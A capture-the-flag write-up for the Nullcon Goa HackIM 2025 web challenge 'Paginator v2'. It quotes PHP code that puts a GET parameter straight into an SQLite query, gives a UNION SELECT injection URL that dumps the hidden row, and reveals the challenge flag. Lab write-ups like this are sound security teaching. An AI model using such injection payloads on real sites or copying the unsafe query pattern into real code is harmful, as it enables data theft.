---
title: "Paginator v2 - Nullcon Goa HackIM 2025 CTF"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "union-select", "base64", "exec", "sqlite", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "This was just a very simple sqli challenge"
source:
  name: "CTFtime writeup #39912"
  url: "https://ctftime.org/writeup/39912"
original_source: "https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/nullcon25/writeup.md#paginator-v2"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Paginator v2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Paginator v2
- **Author team:** QnQSec
- **CTFtime:** <https://ctftime.org/writeup/39912>
- **Original writeup:** <https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/nullcon25/writeup.md#paginator-v2>

---
![image](<https://github.com/user-attachments/assets/016151a8-1591-4c27-adda-85a72214e924>)

This was just a very simple sqli challenge  
![image](<https://github.com/user-attachments/assets/701ed6e6-1e69-416e-970d-e4d34bd73a82>)

Accessing the web page shows this

We can look at the source code  
![image](<https://github.com/user-attachments/assets/3afda063-1917-442c-b788-087befc789bb>)

First we note that it creates a table `pages` with the column as `id, title, content`

```php  
$db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");  
```

Then on the very first row it inserts the flag

```php  
$db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");  
```

This is how it handles our input

```php  
if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {  
[$min, $max] = explode(",",$_GET['p']);  
if(intval($min) <= 1 ) {  
die("This post is not accessible...");  
}  
try {  
$q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";  
$result = $db->query($q);  
while ($row = $result->fetchArray(SQLITE3_ASSOC)) {  
echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"  
";  
}  
}catch(Exception $e) {  
echo "Try harder!";  
}  
} else {  
echo "Try harder!";  
}  
```

It expects the get parameter `p` to be of format `int, int`, but it doesn't allow us to set `min` as `1` basically preventing us from accessing the first post

Then it directly uses our input on the query, leading to an SQL injection vulnerabiltiy

I simply just used a `UNION` operator to show the content of the flag  
![image](<https://github.com/user-attachments/assets/6d595df9-3089-4430-9940-d2b82f21b1d8>)

```  
http://52.59.124.14:5012/?p=2,1 UNION SELECT * FROM pages WHERE id=1  
```

The flag is base64 encoded so just decode it  
![image](<https://github.com/user-attachments/assets/b253a4c1-ec0a-42d9-992c-dd60befd6348>)

```  
Flag: ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}  
```
